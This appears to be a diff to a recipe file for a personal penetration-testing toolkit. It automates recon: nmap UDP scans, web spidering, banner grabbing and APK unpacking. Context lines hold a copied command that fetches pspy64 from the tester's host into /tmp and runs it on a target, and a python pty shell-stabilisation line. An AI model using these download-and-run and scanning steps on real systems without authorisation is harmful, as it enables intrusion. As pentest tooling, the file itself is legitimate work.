@@ -56,7 +56,7 @@ pnmap:
 
 nmap_udp:
 	hack snmp_check
-	nmap -v -sU -p- $(hack ip) -oA nmap_udp
+	sudo nmap -v -sU -p- $(hack ip) -oA nmap_udp
 
 #Get the target ip address from the current directory
 ip:
@@ -114,6 +114,7 @@ log-capture pane:
 http:
 	echo http://$(hack domain):$(hack port) | katana | anew spider_urls | anew urls.txt
 	curl -L -s http://$(hack domain):$(hack port)/robots.txt -o robots.txt
+	curl -v $(hack ip):$(hack port) 2>&1 | grep "Server:" | sed "s/< Server: //g" | anew server
 	echo "vhosts 60" | anew todo.txt
 	echo "fields 60" | anew todo.txt
 	echo "param 60" | anew todo.txt
@@ -123,6 +124,7 @@ http:
 	echo "methods 60" | anew todo.txt
 	echo "source 60" | anew todo.txt
 	echo "tech_stack 60" | anew todo.txt
+	echo "cves 60" | anew todo.txt
 
 smtp:
 	echo "username_enum" | anew todo.txt
@@ -309,6 +311,10 @@ pspy port:
 	@echo "curl http://$(hack lip)/pspy64 -o /tmp/pspy64; chmod 755 /tmp/pspy64; /tmp/pspy64" | xclip -i
 	python3 -m http.server {{port}}
 
+apk:
+	unzip *.apk
+	echo "read_smali 120" | anew todo.txt
+	grep -ir "http://" | grep -v apk
 
 stabilize_linux_shell:
 	echo python3 -c 'import pty; pty.spawn("/bin/bash")'
